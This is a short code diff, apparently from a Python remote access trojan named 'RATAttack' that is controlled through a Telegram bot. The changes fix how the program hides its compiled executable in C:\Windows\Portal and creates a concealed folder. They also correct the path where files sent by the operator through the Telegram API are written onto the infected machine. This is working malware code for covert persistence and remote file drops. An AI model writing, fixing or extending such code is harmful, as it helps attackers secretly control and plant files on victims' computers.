@@ -31,7 +31,7 @@ if (argv[0]).endswith('.exe'):
 	# HIDING OPTIONS
 	# ---------------------------------------------
 	hide_folder = win_folder + r'\Portal'	# = 'C:\Windows\Portal'
-	compiled_name = 'portal.exe'	# Name of compiled .exe to hide in hide_folder
+	compiled_name = 'portal.exe'	# Name of compiled .exe to hide in hide_folder, i.e C:\Windows\Portal\portal.exe
 	# ---------------------------------------------
 	if not os.path.exists(hide_folder):
 		os.makedirs(hide_folder)
@@ -45,6 +45,8 @@ if (argv[0]).endswith('.exe'):
 	shortcut.save()
 else:
 	hide_folder = path[0] + '\\RATAttack'
+	if not os.path.exists(hide_folder):
+		os.makedirs(hide_folder)
 
 initi = False
 user = os.environ.get("USERNAME")	# Windows username
@@ -171,7 +173,7 @@ def handle(msg):
 			file_path = bot.getFile(file_id=file_id)['file_path']
 			link = 'https://api.telegram.org/file/bot' + str(token) + '/' + file_path
 			file = (requests.get(link, stream=True)).raw
-			with open(hidden_folder + file_name, 'wb') as out_file:
+			with open(hide_folder + '//' + file_name, 'wb') as out_file:
 				copyfileobj(file, out_file)
 
 bot = telepot.Bot(token)
